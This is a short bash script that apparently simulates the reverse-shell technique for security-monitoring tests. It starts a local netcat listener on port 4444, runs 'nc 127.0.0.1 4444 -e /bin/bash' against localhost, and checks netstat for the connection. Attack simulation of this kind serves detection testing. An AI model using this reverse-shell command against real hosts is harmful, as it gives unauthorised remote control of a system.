#!/bin/bash

# Define colors
GREEN="\e[32m"
YELLOW="\e[33m"
RED="\e[31m"
BLUE="\e[34m"
CYAN="\e[36m"
RESET="\e[0m"

# Escape to Host Technique
echo -e "${CYAN}\n>>> [Execution] Command and Scripting Interpreter: Unix Shell Technique ${RESET}"
echo -e "${YELLOW}> Let's simulate the case when an attacker uses Reverse Shell to get control over remote host ${RESET}"
echo -e "${BLUE}> https://github.com/aliaksxssv/cloud-security-cheatsheet/blob/main/04%20Execution/Command%20and%20Scripting%20Interpreter%3A%20Unix%20Shell.md ${RESET}"

echo -e "${YELLOW}> Starting local listener on the port 4444 ... ${RESET}"
nc -lvp 4444 &
sleep 2

echo -e "${YELLOW}> Trying to simulate Reverse Shell execution ... ${RESET}"
if ! (nc 127.0.0.1 4444 -e /bin/bash &); then
    echo -e "${RED}Error! Attempt to establisg Reverse Shell was failed ${RESET}"
    else
        echo -e "${GREEN}Success! Reverse Shell connection was established ${RESET}"
fi
sleep 2

echo -e "${YELLOW}> Getting evidence ... ${RESET}"
netstat -otnp | grep 4444